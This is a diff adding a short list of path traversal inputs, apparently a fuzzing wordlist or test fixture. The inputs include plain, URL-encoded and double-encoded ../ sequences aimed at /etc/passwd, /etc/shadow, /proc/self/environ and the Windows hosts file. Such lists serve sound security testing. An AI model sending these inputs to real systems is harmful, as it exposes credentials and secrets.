@@ -1,0 +1,11 @@
+../../../etc/passwd
+..\..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/windows/system32/drivers/etc/hosts
